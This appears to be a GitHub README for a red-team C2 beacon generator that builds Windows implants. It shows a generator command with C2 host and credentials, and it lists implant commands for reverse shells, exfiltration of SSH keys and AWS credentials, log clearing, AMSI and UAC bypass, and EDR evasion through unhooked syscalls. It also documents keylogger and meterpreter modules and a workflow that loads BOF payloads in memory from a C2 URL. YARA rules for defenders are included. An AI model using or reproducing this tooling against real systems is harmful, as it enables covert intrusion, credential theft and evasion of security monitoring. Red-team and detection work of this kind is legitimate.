# 🔥 === Black Basalt Beacon-GEN v0.2.1 ===
<img width="1664" height="928" alt="image" src="https://github.com/user-attachments/assets/e76ce510-dad2-4c6c-9910-c245ff71c9f4" />

## 🔍 INFO
- **GitHub Repository: https://github.com/grisuno/beacon
- **License: GNU General Public License v3.0 (GPLv3)
- **Author**: grisun0
- **Target Platform**: Windows (x64)
- **Source Platform**: GNU/Linux 6.12 (tested on Kali)
- **Purpose**: Academic research and red teaming exercises

> ⚠️ This project is released under GPLv3. See the DISCLAIMER section for full legal terms. 

<img width="1712" height="859" alt="image" src="https://github.com/user-attachments/assets/74a13d86-3d7e-4207-a4bd-4231df9e3ea0" />


## 🔍 Overview
beacon-GEN is a next-generation Bash-based configuration engine designed to generate highly customizable, stealthy C2 beacons for offensive operations. Built as the core orchestration layer of the LazyOwn RedTeam framework, it enables red teams to dynamically configure malleable C2 profiles, AES-256 encrypted communication, multi-UA rotation, and client-side persistence logic — all through a clean, CLI-driven interface.

This script generates the foundational configuration for advanced implants that leverage, APC injection, and anti-analysis routines to evade modern EDR solutions.

Intended for ethical hacking, penetration testing, and academic research, this tool supports seamless integration into automated attack chains and red team infrastructure.
<img width="735" height="994" alt="image" src="https://github.com/user-attachments/assets/2cecaa04-2720-4e7f-9a7a-42e77f14f700" />


## For RedTeamers
```bash
./gen_beacon.sh \
  --target 192.168.1.50 \
  --url https://c2.ejemplo.com:8443 \
  --maleable /api/v2/submit \
  --client-id win10-pro \
  --c2-host 192.168.1.10 \
  --c2-user AdminC2 \
  --c2-pass "P@ssw0rd_Secret_2025" \
  --c2-port 8443 \
  --aes-key aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899 \
  --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
  --user-agent1 "Chrome/120.0.0.0 Safari/537.36" \
  --user-agent2 "CustomAgent/1.0 (compatible)" \
  --user-agent3 "BotNet-X/2.5" \
  --output hellbird.exe
```
<img width="1438" height="921" alt="image" src="https://github.com/user-attachments/assets/3a724561-230f-462a-bcc4-50bf7da76012" />


## For BlueTeamers

```yara
rule beacon_GEN_Config_Template {
    meta:
        author = "LazyOwn BlueTeam"
        description = "Detects beacon-GEN generated C2 configuration"
        license = "GPLv3"

    strings:
        $c2_url_macro = "C2_URL \"$URL\"" ascii wide
        $maleable_macro = "MALEABLE \"$MALEABLE\"" ascii wide
        $client_id_macro = "CLIENT_ID \"$CLIENT_ID\"" ascii wide
        $aes_key_64char = /[0-9a-f]{64}/
        $winhttp_init = "WinHttpOpen(" ascii wide
        $user_agent_var = "TRAFFIC_UAS[]" ascii wide
        $output_name = "beacon.exe" ascii wide nocase

    condition:
        all of ($c2_url_macro, $maleable_macro, $client_id_macro) and
        $aes_key_64char and $winhttp_init and $user_agent_var
}
```

```yara
rule hellbird_Runtime_Behavior {
    meta:
        author = "LazyOwn BlueTeam"
        description = "Detects runtime behavior of HELLBIRD beacon"
        reference = "https://github.com/grisuno/hellbird"

    strings:
        $nt_queue_apc = "NtQueueApcThread" ascii wide
        $create_suspended = { 6A 04 6A 00 6A 00 6A 00 6A 00 6A 00 } // CREATE_SUSPENDED
        $aes_decrypt = "AES_ECB_encrypt" ascii wide
        $registry_persistence = "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run" ascii wide
        $http_post_enc = "POST /" ascii wide
        $base64_decode = "base64_decode" ascii wide

    condition:
        $nt_queue_apc and $create_suspended and $aes_decrypt and
        ($registry_persistence or $http_post_enc) and $base64_decode
}
```

![image](https://github.com/user-attachments/assets/4e114c5c-d28d-4570-9e02-6868bb838dd2)

## **Available beacon commands**:
 - **stealth_off** stop being stealthy, Disables stealth mode, allowing normal operations.
 - **stealth_on** enter ninja mode, Enables stealth mode, minimizing activity to avoid detection.
 - **download:** download:[filename] Downloads a file from the C2 to the compromised host.
 - **upload:** [filename]: Uploads a file from the compromised host to the C2.
 - **rev:** Establishes a reverse shell to the C2 using the configured port.
 - **exfil:** Exfiltrates sensitive data (e.g., SSH keys, AWS credentials, command histories).
 - **download_exec:** download_exec:[url]: Downloads and executes a binary from a URL (Linux only, stored in /dev/shm).
 - **obfuscate:** [filename]: Obfuscates file timestamps to hinder forensic analysis.
 - **cleanlogs:** Clears system logs (e.g., /var/log/syslog on Linux, event logs on Windows).
 - **discover:** Performs network discovery, identifying live hosts via ping.
 - **adversary:**[id_atomic]: Executes an adversary emulation test (MITRE ATT&CK) using downloaded atomic redteam framework scripts.
 - **softenum:** Enumerates useful software on the host (e.g., docker, nc, python).
 - **netconfig:** Captures and exfiltrates network configuration (e.g., ipconfig on Windows, ifconfig on Linux).
 - **escalatelin:** Attempts privilege escalation on Linux (e.g., via sudo -n or SUID binaries).
 - **proxy:**[listenip]:[listenport]:[targetip]:[targetport] Starts a TCP proxy redirecting traffic from listenAddr to targetAddr.
 - **stop_proxy:**[listenaddr] Stops a TCP proxy on the specified address.
 - **portscan:** Scans ports on discovered hosts and the configured rhost.
 - **compressdir:**[directory]: Compresses a directory into a .tar.gz file and exfiltrates it.
 - **sandbox:** Get info about the system if it's a sandbox or not.
 - **isvm:** Get info about the system if it's a virtual machine or not.
 - **debug:** Get info about the system if the target is debugged or not.
 - **persist:** Try to persist mechanism in the target system.
 - **simulate:** Execute a simulation of a legit web page like youtube.
 - **migrate:** Inject a payload into a suspended process and resume it. If no payload is specified, the current process is injected (self-migration).
 - **shellcode:** Download and execute a shellcode in memory. Supports multiple operative systems and formats msfvenom friendly (in windows the technique used is Early brid APC Injection).
 - **amsi:** Bypass AMSI (Anti-Malware Scan Interface) on Windows systems to evade detection by PowerShell, WMI, and other scripting engines.
 - **load_module:** load dll on Windows systems to evade detection loading in memory from an url
 - **bof:** load COFF BOF object file on Windows systems to evade detection loading in memory from an url (COFFLoader3 inspired in [COFFLoader] (https://github.com/trustedsec/COFFLoader/) & [CoffeeLdr](https://github.com/Cracked5pider/CoffeeLdr)) (Like Cobalt Strike)
 - **hook:** Get syscalls hooked by AV/EDR/OTHER (By using direct, unhooked syscalls — as demonstrated in functions like CreateFileA_Unhooked and WriteProcessMemory_Unhooked, and implemented via manually resolved NTAPI stubs such as g_pNtCreateFileUnhooked, g_pNtWriteVirtualMemoryUnhooked, g_pNtProtectVirtualMemoryUnhooked, g_pNtResumeThreadUnhooked, and g_pNtCreateThreadExUnhooked — it is possible to invoke low-level Windows API functionality while completely bypassing user-mode hooks commonly placed by security products. This technique is highly evasive against traditional AV and modern EDR solutions, as it avoids instrumented or hooked Win32 API layers entirely, operating directly at the NT syscall boundary — a level where many security tools lack visibility or choose not to monitor due to performance overhead and complexity.).
 - **terminate:** Terminates the implant or beacon, removing files and persistence mechanisms.

## 🔥 Modules
This beacon have load_module command you need pass a url to an dll module, for now we have 5 modules, revshell, Metasploit meterpreter, Keylogger, Stealth Command and Screenshot.

<img width="1025" height="893" alt="image" src="https://github.com/user-attachments/assets/74e70f1d-4908-4483-af30-860a60c9bbd7" />


- **Reverse Shell** : gen_dll_rev.sh
- **Metasploit Meterpreter**: gen_dll.sh
- **Screenshot**: gen_dll_ss.sh
- **Keylogger**: gen_key.sh
- **Stealth Command**: gen_module.sh

<img width="1697" height="516" alt="image" src="https://github.com/user-attachments/assets/14c62e2a-321d-4996-b2c0-98a165499f1e" />


## 🚀 Feature: bof: — Execute COFF BOF Objects In-Memory (Cobalt Strike Style)

<img width="1328" height="1328" alt="image" src="https://github.com/user-attachments/assets/22e3d203-764e-4c7f-8f74-83797c4440fd" />

Evade EDR/AV detection by loading and executing position-independent BOF (Binary Object File) payloads directly from a remote URL — without touching disk, without LoadLibrary, and without traditional PE loaders. 

This feature is inspired by — but goes beyond — industry-standard tools like TrustedSec’s COFFLoader and CoffeeLdr . It’s engineered for stealth, reliability, and deep Windows internals compliance.

<img width="1710" height="602" alt="image" src="https://github.com/user-attachments/assets/99a5a560-8926-4743-af7c-99b46ef9129e" />


### 🎯 How It Works — The Engineering Breakdown
1. Command Syntax
   
```bash
bof:http://your-c2.com/payload.x64.o [optional_args]
```
- Downloads the raw .o (COFF) file over HTTP(S).
- Parses the COFF structure in-memory.
- Maps sections (.text, .rdata, .pdata, etc.) into PAGE_EXECUTE_READWRITE regions.
- Applies x64 relocations (ADDR64, REL32, REL32_1-5, etc.) with trampoline generation for out-of-range jumps.
- Resolves external symbols (e.g., BeaconPrintf, GetModuleHandleA, CoInitializeEx) via a precomputed DJB2 hash table.
- Executes the target function (usually go) with aligned stack and proper calling convention (ms_abi).
<img width="768" height="992" alt="image" src="https://github.com/user-attachments/assets/a1732ce6-2910-4ae4-9c68-9aea15a70d38" />


### 2. Why COFF?

- No PE Headers: Avoids LoadLibrary and module list enumeration.
- No Imports Section: Symbols are resolved manually via hash — invisible to static analysis.
- Position Independent: Code can be relocated anywhere in memory.
- Cobalt Strike Compatible: BOFs compiled with x86_64-w64-mingw32-gcc -c -fPIC work out-of-the-box.

### 3. Symbol Resolution — The Heart of the System
Your BOF doesn’t call GetModuleHandleA directly — it calls __imp_GetModuleHandleA, a thunk pointer that must be patched at load time.

<img width="856" height="981" alt="image" src="https://github.com/user-attachments/assets/b3d7279b-092a-48b4-90b5-1b82a7b6d424" />

### ✅ Our loader does this correctly by:
![descarga](https://github.com/user-attachments/assets/34b3fc18-9a3e-45b7-a1e7-c7d70a0f0c7f)<svg aria-roledescription="flowchart-v2" role="graphics-document document" viewBox="-28 -28 2763.356689453125 3519.65625" style="max-width: 2699.356689453125px;" class="flowchart" xmlns="http://www.w3.org/2000/svg" width="2763.356689453125" id="mermaid-1eec05c6-8365-4a09-b178-c1613f7251ab" height="3519.65625"><rect x="-28" y="-28" width="2763.356689453125" height="3519.65625" fill="#191919"/>
- Including both versions in the symbol hash table:

```c
{ 0x3EB5B2FB, (void*)&__imp_GetModuleHandleA }, // "__imp_GetModuleHandleA"
{ 0x3EB5B2FB, (void*)GetModuleHandleA         }, // "GetModuleHandleA" (fallback)
```
- Using extern FARPROC __imp_* in BOF source code to force correct linking.
- Validating pointer sanity (> 0x10000) before execution.

### 4. Memory & Security Engineering
- RWX Pages: Sections are mapped as PAGE_EXECUTE_READWRITE during relocation, then optionally protected.
- Trampolines: Auto-generated for REL32 calls that exceed 2GB range — no manual assembly required.
- Stack Alignment: The call_go_aligned wrapper ensures 16-byte stack alignment before BOF entry.
- No CRT: Zero dependency on msvcrt.dll — uses only WinAPI and Beacon API.

### Built-in verbose logging lets you trace every step:

```text
[BOF] ✅ Resuelto 'GetModuleHandleA' → 0x00007FF690217770
[BOF] 🔧 Aplicando reloc tipo 4 en 0x000001A802DB1234 -> 0x00007FF690217770
[DEBUG] GetModuleHandleA = 0x00007FF690217770
[DEBUG] GetModuleHandleA bytes: 4C 8B DC 48 83 EC 20
```
🛠️ How to Create Your Own BOFs
- Step 1: Write Your BOF (C Source)
```c
#include <windows.h>
#include "beacon.h"

// Declare imports correctly — THIS IS CRITICAL
extern PVOID __imp_GetModuleHandleA;
extern PVOID __imp_GetProcAddress;
extern PVOID __imp_LoadLibraryA;

void go(char *args, int alen) {
    BeaconPrintf(CALLBACK_OUTPUT, "[MYBOF] Started with args: %.*s", alen, args);

    // Use __imp_* thunks — DO NOT call GetModuleHandleA() directly
    HMODULE hKernel32 = ((HMODULE(WINAPI*)(LPCSTR))__imp_GetModuleHandleA)("kernel32.dll");
    if (!hKernel32) {
        BeaconPrintf(CALLBACK_ERROR, "[MYBOF] ❌ Failed to get kernel32");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[MYBOF] Success! hKernel32 = %p", hKernel32);
}
```

### Step 2: Compile to COFF (.o file)
```bash
x86_64-w64-mingw32-gcc -c -fPIC -O2 -fno-stack-protector -nostdlib \
  -fno-builtin -masm=intel -fno-asynchronous-unwind-tables \
  mybof.c -o mybof.x64.o
```

## Step 3: Host and Execute

```bash
# Host the .o file
python3 -m http.server 8080

# In your beacon console:
bof:http://localhost:8080/mybof.x64.o "Hello World"
```

### 📌 Pro Tips
- Always use extern FARPROC __imp_FunctionName in your BOF — never assume the loader will magically fix it.
- Test with whoami.c and Lapsdump.c — they’re battle-tested reference implementations.
- If you see 0x9090... or 0x7ff7... addresses, your symbol hash table is missing __imp_* entries.
- Use objdump -t yourbof.x64.o | grep "UND" to list all undefined symbols your BOF needs.
- Never use string literals for DLL names — use stack buffers: char k32[] = {'k','e','r','n','e','l','3','2','.','d','l','l',0};

### 🧪 Example BOFs Included

- **whoami.c**: Retrieves current username and computer name — perfect for testing symbol resolution.
- **Test.c**:  Test BOF to start develops or test the loader.
- **calc.c**:  Start a calc.
- **etw.c**:  Etw patch in memory.
- **cmdwhoami.c**:  Run command and save the result (whoami).
- **getenv.c**:  Get environment vars.
- **persist.c**:  Add a entry reg to persist the beacon.exe.
- **shellcode.c**:  Run shellcode in memory.
- **winver.c**:  Show the windows versión on screen.
- **scan_shellcode.c**:  Check for any memory block that is protected with RWX to execute a shellcode
- **disablelog.c**:  Disable EventLog, find these threads and simply suspend them and disable windows event logging
- **vncrelay.c**:  Vnc port forward to expose port by socket and relay to the vnc service
- **uacbypass.c**:  Disable uac, to bypass it.
- **amsibypass.c**:  Disable amsi, to bypass it.
- **persistsvc.c**:  Add a service to persist the beacon.exe.
- **loadvnc.c**:  inject a vncserver dll into a process to execute a vnc server.
- **sock5.c**:  One Shot Sock5 proxy, it's experimental and under develop.
- **upload.c**:  Upload a file to a LazyOwn RedTeam Framework C2 ssl/aes.
  
<img width="1682" height="699" alt="image" src="https://github.com/user-attachments/assets/781cddd4-e3f6-4f3b-b032-dda2b82962a5" />
<img width="877" height="762" alt="image" src="https://github.com/user-attachments/assets/f1e3259d-8695-4885-96f8-e005aadce6ee" />
<img width="1710" height="731" alt="image" src="https://github.com/user-attachments/assets/af25330a-005c-4a19-9d53-8bd7a59c21ce" />


### 🧠 generate_hashes.py — The Symbol Hash Generator
> Automatically regenerates the g_symbol_table[] in COFFLoader.c to ensure 100% symbol resolution accuracy for your BOFs. 

This script is not just a convenience — it’s a critical component of your loader’s reliability. It eliminates human error in hash calculation and ensures that every external function your BOF needs is pre-resolved with surgical precision.

### 🎯 Why This Script Exists
When you compile a BOF with x86_64-w64-mingw32-gcc -c -fPIC, the compiler generates undefined external symbols (e.g., __imp_GetModuleHandleA, BeaconPrintf). Your loader (COFFLoader.c) must resolve these symbols at runtime by matching their name to a precomputed DJB2 hash.

Manually calculating and updating these hashes is:

- ❌ Error-prone (one wrong bit = crash).
- ❌ Tedious (dozens of symbols).
- ❌ Unsustainable (every new BOF or API requires updates).
generate_hashes.py automates this process, guaranteeing that your g_symbol_table[] is always in sync with your BOF’s requirements.

### 🔍 How It Works — Step by Step
1. The DJB2 Hash Algorithm
The script implements the Daniel J. Bernstein hash function (DJB2), which is:

- ✅ Fast.
- ✅ Case-sensitive (critical for Windows API names).
- ✅ Produces 32-bit values (perfect for your SymbolHash struct).

```python
def djb2(s):
    h = 5381
    for c in s:
        h = ((h << 5) + h) + ord(c)  # h * 33 + c
    return h & 0xFFFFFFFF             # Ensure 32-bit result
```
<img width="1703" height="271" alt="image" src="https://github.com/user-attachments/assets/a4c260a1-922e-4859-b7ab-5b1d03bbdc7e" />

2. The Symbol List
The imp_functions list contains every external symbol your BOFs might need. It includes:

- Beacon APIs (e.g., __imp_BeaconPrintf, BeaconOutput).
- Critical Win32 APIs (e.g., __imp_LoadLibraryA, __imp_GetModuleHandleA).
- COM/OLE APIs (e.g., __imp_CoInitializeEx, __imp_VariantClear).
- CRT/String APIs (e.g., wcslen, memcpy, sprintf).

```python
imp_functions = [
    "__imp_BeaconPrintf",
    "__imp_LoadLibraryA",
    "__imp_GetModuleHandleA",
    # ... 30+ more symbols
    "BeaconOutput",
]
```

### 3. Output Format
The script prints C code snippets ready to be copy-pasted directly into COFFLoader.c:
```c
{ 0x700d8660, (void*)BeaconPrintf }, // "__imp_BeaconPrintf"
{ 0x266a0b1e, (void*)LoadLibraryA }, // "__imp_LoadLibraryA"
{ 0x3eb5b2fb, (void*)GetModuleHandleA }, // "__imp_GetModuleHandleA"
```
> Note the pattern:
> { 0x<hex_hash>, (void*)<FunctionNameWithout__imp_> }, // "<OriginalSymbolName>" 

This format is exactly what your loader expects in g_symbol_table[].

### 🛠️ How to Use It — The Professional Workflow
Step 1: Add New Symbols
If you write a new BOF that uses, say, __imp_CreateFileA, add it to the imp_functions list:
```c
imp_functions = [
    # ... existing symbols ...
    "__imp_CreateFileA",  # ← Add this line
]
```
step 2: copy and paste into the COFFLoader3.c in g_symbol_table
Step 3: Verify in Your BOF
In your BOF source code (e.g., Test.c), ensure you declare the import correctly:
```c
extern FARPROC __imp_CreateFileA; // ← Must match the name in imp_functions
```
### 🧩 Why the __imp_ Prefix Matters
Windows uses import thunks — small stubs that jump to the real function in a DLL. When your BOF is compiled, it references __imp_GetModuleHandleA, not GetModuleHandleA.

Your loader must resolve the thunk address, not the function address. That’s why the script generates:
```c
{ 0x3eb5b2fb, (void*)GetModuleHandleA }, // "__imp_GetModuleHandleA"
```
Here:

- 0x3eb5b2fb is the hash of "__imp_GetModuleHandleA" (the symbol your BOF actually uses).
- (void*)GetModuleHandleA is the address of the thunk (which you declared with extern PVOID __imp_GetModuleHandleA; in beacon.c).
If you skip the __imp_ prefix in your hash table, your BOF will crash with 0x9090... or 0x7ff7... — because it’s reading garbage from an uninitialized thunk.

### 🪲 Common Pitfalls & Fixes

- ❌ SÍMBOLO NO RESUELTO: '__imp_GetModuleHandleA'
Symbol missing from imp_functions Add it to the list and rerun generate_hashes.py

- GetModuleHandleA = 0x90900001233a25ff
Hash table has wrong symbol name (e.g., used "GetModuleHandleA" instead of "__imp_GetModuleHandleA" )
Ensure the comment in the hash table entry matches the BOF’s symbol name.
Crash on first API call Forgot to declare extern PVOID __imp_FunctionName; in beacon.c

### ✅ Best Practices for Symbol Management
- Keep imp_functions Comprehensive: Add every API you might ever use — it’s cheaper than debugging a crash.
- Run the Script Religiously: Make it part of your gen_beacon.sh:
- Use Meaningful Comments: The // "__imp_FunctionName" comment is your lifeline during debugging.
- Validate with objdump: After compiling your BOF, run:


```bash
x86_64-w64-mingw32-objdump -t your_borf.x64.o | grep "UND"
```

### 🚀 Pro Tip: Dynamic Hash Generation (Advanced)
For maximum flexibility, you could modify RunCOFF to calculate hashes on-the-fly instead of using a static table. However, this:

- ⚠️ Adds runtime overhead.
- ⚠️ Increases code size.
- ⚠️ Makes debugging harder.
  
The static table approach (powered by generate_hashes.py) is faster, smaller, and more reliable — perfect for post-exploitation tooling.

### 📎 Final Note
This script is the bridge between your high-level BOF code and the low-level Windows loader. It’s a small piece of Python, but it’s responsible for the stability of your entire operation.

Treat it with respect. Update it religiously. And never, ever, calculate a DJB2 hash by hand again.

## 🎓 Educational Purpose
This project is intended to:

- Help red teams understand modern C2 evasion techniques.
- Assist blue teams in developing better detection logic.
- Promote research into secure software design and defensive hardening.
- Demonstrate the importance of runtime analysis over static signatures.

## ⚠️ DISCLAIMER - NO WARRANTY OR LIABILITY
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

## 🔗 Links
- https://deepwiki.com/grisuno/beacon
- https://github.com/grisuno/LazyOwn
- https://grisuno.github.io/LazyOwn/
- https://www.reddit.com/r/LazyOwn/
- https://github.com/grisuno/LazyOwnBT
- https://web.facebook.com/profile.php?id=61560596232150
- https://app.hackthebox.com/teams/overview/6429
- https://app.hackthebox.com/users/1998024
- https://patreon.com/LazyOwn
- https://deepwiki.com/grisuno/ebird3
- https://deepwiki.com/grisuno/hellbird
- https://github.com/grisuno/cgoblin
- https://github.com/grisuno/gomulti_loader
- https://github.com/grisuno/ShadowLink
- https://github.com/grisuno/OverRide
- https://github.com/grisuno/amsi
- https://medium.com/@lazyown.redteam
- https://discord.gg/V3usU8yH
- https://ko-fi.com/Y8Y2Z73AV
- https://medium.com/@lazyown.redteam/black-basalt-beacon-when-your-coff-loader-becomes-a-silent-operator-and-why-thats-by-design-not-4094c92a73a5
- https://github.com/grisuno/LazyOwn/archive/refs/tags/release/0.2.61.tar.gz

![jimeng-2025-06-29-179-Cyberpunk-style logo for 'LazyOwn RedTeam', hacking_pen-testing tool  Colors_ ](https://github.com/user-attachments/assets/83d366ef-f899-4416-8559-20bd9fd34ef4)

![Python](https://img.shields.io/badge/python-3670A0?style=for-the-badge&logo=python&logoColor=ffdd54) ![Shell Script](https://img.shields.io/badge/shell_script-%23121011.svg?style=for-the-badge&logo=gnu-bash&logoColor=white) ![Flask](https://img.shields.io/badge/flask-%23000.svg?style=for-the-badge&logo=flask&logoColor=white) [![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)

[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/Y8Y2Z73AV)
